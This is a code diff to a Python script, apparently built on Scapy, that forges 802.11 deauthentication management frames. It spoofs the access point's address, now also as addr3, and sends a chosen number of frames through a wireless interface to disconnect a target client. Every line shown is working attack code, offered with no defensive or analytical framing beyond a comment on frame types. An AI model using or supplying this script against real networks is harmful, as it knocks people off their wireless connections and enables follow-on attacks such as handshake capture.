@@ -38,8 +38,9 @@ else:
     receiver = arguments.c
 
 # Dot11 -> type 0 is a management frame (deauth packet are management frame), subtype 12 is the subtype for the deauth management frame.
-deauthPacket = RadioTap() / Dot11(type=0, subtype=12, addr1=receiver,addr2=sender) / Dot11Deauth(reason=arguments.reason)
+deauthPacket = RadioTap() / Dot11(type=0, subtype=12, addr1=receiver,addr2=sender, addr3=sender) / Dot11Deauth(reason=arguments.reason)
+
+print("Sending deauth packet...")
 
 # Sending crafted packet
-for i in range(0, arguments.number):
-    sendp(deauthPacket, iface=arguments.interface)
+sendp(deauthPacket, iface=arguments.interface, verbose=False, count=arguments.number)
